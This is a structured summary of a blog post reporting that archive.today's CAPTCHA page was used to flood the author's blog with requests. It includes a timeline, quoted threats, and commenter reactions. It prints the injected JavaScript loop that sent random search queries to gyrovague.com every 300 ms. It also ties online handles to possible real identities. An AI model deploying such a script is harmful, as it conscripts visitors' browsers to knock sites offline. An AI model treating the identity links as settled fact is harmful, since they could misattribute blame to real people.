---
url: https://gyrovague.com/2026/02/01/archive-today-is-directing-a-ddos-attack-against-my-blog/
title: "archive.today is directing a DDOS attack against my blog"
author: Jani Patokallio (jpatokal)
date_fetched: 2026-05-15
date_published: 2026-02-01
topics:
  - ideas-and-culture
---

# archive.today is directing a DDOS attack against my blog

By Jani Patokallio, February 1, 2026 (updated February 20, 2026)

## The Core Claim

Around January 11, 2026, archive.today (also known as archive.is, archive.md) began using its own users as proxies to conduct a distributed denial of service attack against the author's personal blog, Gyrovague.com.

## Technical Details

The JavaScript code embedded in archive.today's CAPTCHA page:

```javascript
setInterval(function() {
    fetch("https://gyrovague.com/?s=" + Math.random().toString(36).substring(2, 3 + Math.random() * 8), {
        referrerPolicy: "no-referrer",
        mode: "no-cors"
    });
}, 300);
```

- Frequency: Every 300 milliseconds as long as the CAPTCHA page remains open
- Mechanism: Makes requests to the blog's search function using random strings, preventing caching and consuming server resources
- Location in code: Line 136 of the CAPTCHA page's top-level HTML file
- Effectiveness: uBlock Origin stops the requests; users may need to disable it to observe the behavior
- Hosting impact: None for the author (flat-fee hosting plan)

## Timeline

| Date | Event |
|------|-------|
| August 5, 2023 | Author publishes original OSINT investigation: "On the trail of the mysterious guerrilla archivist of the Internet" |
| November 5, 2025 | Heise Online reports FBI subpoenaed archive.today's domain registrar Tucows; both Heise and ArsTechnica link to the author's 2023 post |
| November 13, 2025 | AdGuard DNS publishes blog post about WAAD (Web Abuse Association Defense) pressuring them to block archive.today domains |
| January 8, 2026 | Automattic/WordPress.com receives GDPR complaint from "Nora" about the author's post; author rebuts with AI-composed response; Automattic sides with author |
| January 10, 2026 | archive.today webmaster emails politely requesting post removal for "a few months" — classified as spam by Gmail, spotted 5 days later |
| January 14, 2026 | Hacker News user "rabinovich" posts "Ask HN: Weird archive.today behavior?" noting DDOS-like behavior starting ~3 days prior (first public mention) |
| January 15, 2026 | Author responds to webmaster email |
| January 20, 2026 | Author follows up — no response received |
| January 21, 2026 | Commit adds gyrovague.com to dns-blocklists (used by uBlock Origin), making DDOS script requests get blocked |
| January 25, 2026 | Author emails webmaster third time with draft of this post, declining takedown but offering wording changes; "Nora" responds with threats |

## The Email Threats (from "Nora")

The author received an increasingly unhinged series of threats including:

- Threatening to use the author's "noble and rare name" for "the name of a scam project or become a byword for a new category of AI porn"
- Threatening an OSINT investigation into the author's grandfather, calling him a "Nazi" — the author clarifies his grandfather "served in an anti-aircraft unit of the Finnish Army during WW2, defending against the attacks of the Soviet Union"
- Threatening to "vibecode a gyrovague.gay dating app"

## Identities Discussed

1. "Nora" — Sent the GDPR complaint, replied as archive.today webmaster, has Hacker News account (nora-puchreiner), posted on Russian LiveJournal (nora_puchreiner), also appeared on KrebsonSecurity. Updated February 20, 2026: The author notes it "appears increasingly likely that the identity of 'Nora' has been appropriated from an actual person" whose only connection was a takedown request. The author redacted their last name as a courtesy.

2. "rabinovich" — Hacker News user who posted about the DDOS and also runs Ghostarchive.org. The name "Masha Rabinovich" is associated with archive.today.

3. "Richard Président" — from WAAD (Web Abuse Association Defense), offered to assist with a GDPR counter-complaint, "transparently mentioning that this could be tied to 'a request for identity verification'."

## Author's Stated Motivation

The author says the 2023 investigation was "boringly straightforward" — curiosity about a widely-used but little-understood service, similar to prior posts about a sketchy crypto ICO, monetization in Clash of Clans, and Japanese subway construction. The 2023 post gathered ~10,000 views and some HN discussion. "It's also the only post on my blog that references archive.today."

## Notable Comment Quotes

- "It doesn't matter": Defends archive.today, calls the author's rationale "entirely self centered and low IQ," and says "When archive.today shuts down, in part because of your complicity, I'll lose access to ~40% of news sites."
- "throwaway": Argues the author "almost doxxed" a potentially Russian person during wartime, urging post removal for their safety.
- "ka": Responds "What 'doxx'? Are you on drugs? Not only was that info not secret and not initially revealed or discovered by this person"
- "Trobador": Notes "This is clearly the same person replying" about suspicious comment patterns; also states "archive.today is undeniably in the wrong for revenge DDoS-ing a personal blog, both morally and legally."
- "Noticer": Observes the irony that archive.today "is notorious for refusing to remove information no matter what" yet is obsessively censoring breadcrumbs about themselves.
- "Nick S": Notes the landing page references Russia Today (RT) and suggests "activated their famous bot farms to write stupid comments."
